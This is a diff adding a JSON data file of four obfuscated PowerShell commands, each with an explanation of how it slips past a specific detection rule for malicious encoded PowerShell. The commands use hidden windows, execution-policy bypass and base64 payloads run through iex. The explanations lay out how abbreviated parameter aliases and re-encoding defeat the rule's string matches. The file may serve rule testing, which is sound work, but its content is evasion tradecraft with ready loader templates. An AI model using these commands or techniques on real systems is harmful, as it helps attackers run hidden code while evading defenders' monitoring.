@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -W H -St $d = [System.Convert]::FromBase64String('cwB2ACAAbwAgA...'); [System.Text.Encoding]::Unicode.GetString($d) | iex",
+    "explanation": "The bypass targets selection_1 by using parameter aliases. The rule explicitly looks for '-Window' AND 'Hidden'. By using '-W H' (the abbreviated form) or simply '-W 1', the 'Hidden' string requirement is not met. Furthermore, using '-St' instead of '-Sta' avoids the full string match while achieving the same Single-Threaded Apartment mode."
+  },
+  {
+    "output": "$o = New-Object IO.MemoryStream; $data = [System.Convert]::FromBase64String('...'); iex ([System.Text.Encoding]::ASCII.GetString($data))",
+    "explanation": "The bypass targets selection_2 by breaking up the signature 'sv o (New-Object IO.MemorySteam);sv d '. Instead of using the 'sv' (Set-Variable) alias in a single line, variables are assigned directly using standard PowerShell syntax, and a typo in the original rule ('MemorySteam' vs 'MemoryStream') is avoided or shifted so the exact string match fails."
+  },
+  {
+    "output": "powershell.exe -e cwB2ACAAbwAgA...",
+    "explanation": "The rule in selection_1 specifically checks for '-EncodedCommand'. PowerShell allows truncation of parameters as long as they are unambiguous. Using '-e', '-enc', or '-encoded' bypasses the literal string check for '-EncodedCommand' while still executing the base64 payload."
+  },
+  {
+    "output": "powershell.exe -NoP -ExecutionPolicy Bypass -W 1 -C \"[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('cwB2ACAAbwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACkAOwBzAHYAIABkACAA')) | iex\"",
+    "explanation": "This bypasses selection_1 by replacing the long-form '-Window Hidden' and '-Sta' flags with shortened aliases (like '-W 1' for WindowStyle Hidden) or omitting them entirely. It bypasses selection_2 by encoding the known malicious string ('sv o (New-Object IO.MemorySteam);sv d ') within a secondary Base64 blob that is decoded at runtime, ensuring the static string and its specific Base64 signature 'cwB2ACAAbwAgA' do not appear in the command line logs."
+  }
+]
